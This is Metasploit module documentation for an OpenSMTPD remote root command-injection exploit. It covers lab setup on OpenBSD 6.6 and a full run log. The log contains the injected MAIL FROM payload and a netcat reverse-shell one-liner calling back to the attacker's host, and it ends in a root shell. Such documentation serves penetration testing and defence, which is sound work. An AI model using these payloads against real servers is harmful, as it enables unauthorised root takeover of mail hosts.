## Vulnerable Application

### Description

This module exploits a command injection in the `MAIL FROM` field during
SMTP interaction with OpenSMTPD to execute a command as the root user.

### Setup

1. Download [OpenBSD 6.6](https://cdn.openbsd.org/pub/OpenBSD/6.6/amd64/install66.iso)
2. Install the system, noting the domain name (defaults to `foo.localdomain` in VMware)
3. Configure the following settings in `/etc/mail/smtpd.conf`:
  * `listen on all`
  * `match from any for domain "foo.localdomain" action "local_mail"`
4. Execute `/etc/rc.d/smtpd restart` to restart OpenSMTPD
5. Execute `ifconfig` and look for an appropriate target IP

## Verification Steps

Follow [Setup](#setup) and [Scenarios](#scenarios).

## Targets

### 0

This targets OpenSMTPD versions 6.4.0 through 6.6.1.

## Options

### RCPT_TO

Set this to a valid mail recipient. The default is `root`.

## Scenarios

### OpenSMTPD 6.6.0 on OpenBSD 6.6

```
msf5 > use exploit/unix/smtp/opensmtpd_mail_from_rce
msf5 exploit(unix/smtp/opensmtpd_mail_from_rce) > options

Module options (exploit/unix/smtp/opensmtpd_mail_from_rce):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   RCPT_TO  root             yes       Valid mail recipient
   RHOSTS                    yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT    25               yes       The target port (TCP)


Payload options (cmd/unix/reverse_netcat):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST                   yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   OpenSMTPD 6.4.0 - 6.6.1


msf5 exploit(unix/smtp/opensmtpd_mail_from_rce) > set rhosts 172.16.249.137
rhosts => 172.16.249.137
msf5 exploit(unix/smtp/opensmtpd_mail_from_rce) > set lhost 172.16.249.1
lhost => 172.16.249.1
msf5 exploit(unix/smtp/opensmtpd_mail_from_rce) > run

[+] mkfifo /tmp/twkfr; nc 172.16.249.1 4444 0</tmp/twkfr | /bin/sh >/tmp/twkfr 2>&1; rm /tmp/twkfr
[*] Started reverse TCP handler on 172.16.249.1:4444
[*] 172.16.249.137:25 - Executing automatic check (disable AutoCheck to override)
[!] 172.16.249.137:25 - The service is running, but could not be validated.
[*] 172.16.249.137:25 - Connecting to OpenSMTPD
[*] 172.16.249.137:25 - Saying hello and sending exploit
[*] 172.16.249.137:25 - Expecting: /220.*OpenSMTPD/
[+] 172.16.249.137:25 - Received: 220 foo.localdomain ESMTP OpenSMTPD
[*] 172.16.249.137:25 - Sending: HELO JijrF2eskbXFfdlaV
[*] 172.16.249.137:25 - Expecting: /250.*pleased to meet you/
[+] 172.16.249.137:25 - Received:
250 foo.localdomain Hello JijrF2eskbXFfdlaV [172.16.249.1], pleased to meet you
[*] 172.16.249.137:25 - Sending: MAIL FROM:<;for W in a n 0 9 g D 7 N 7 B K R i u;do read W;done;sh;exit 0;>
[*] 172.16.249.137:25 - Expecting: /250.*Ok/
[+] 172.16.249.137:25 - Received:
250 2.0.0 Ok
[*] 172.16.249.137:25 - Sending: RCPT TO:<root>
[*] 172.16.249.137:25 - Expecting: /250.*Recipient ok/
[+] 172.16.249.137:25 - Received:
250 2.1.5 Destination address valid: Recipient ok
[*] 172.16.249.137:25 - Sending: DATA
[*] 172.16.249.137:25 - Expecting: /354 Enter mail.*itself/
[+] 172.16.249.137:25 - Received:
354 Enter mail, end with "." on a line by itself
[*] 172.16.249.137:25 - Sending:
#
#
#
#
#
#
#
#
#
#
#
#
#
#
mkfifo /tmp/rsnzh; nc 172.16.249.1 4444 0</tmp/rsnzh | /bin/sh >/tmp/rsnzh 2>&1; rm /tmp/rsnzh
[*] 172.16.249.137:25 - Sending: .
[*] 172.16.249.137:25 - Expecting: /250.*Message accepted for delivery/
[+] 172.16.249.137:25 - Received:
250 2.0.0 5bd4f87d Message accepted for delivery
[*] 172.16.249.137:25 - Sending: QUIT
[*] 172.16.249.137:25 - Expecting: /221.*Bye/
[+] 172.16.249.137:25 - Received:
221 2.0.0 Bye
[*] Command shell session 1 opened (172.16.249.1:4444 -> 172.16.249.137:28550) at 2020-02-28 10:28:14 -0600

id
uid=0(root) gid=0(wheel) groups=0(wheel)
uname -a
OpenBSD foo.localdomain 6.6 GENERIC#353 amd64
```
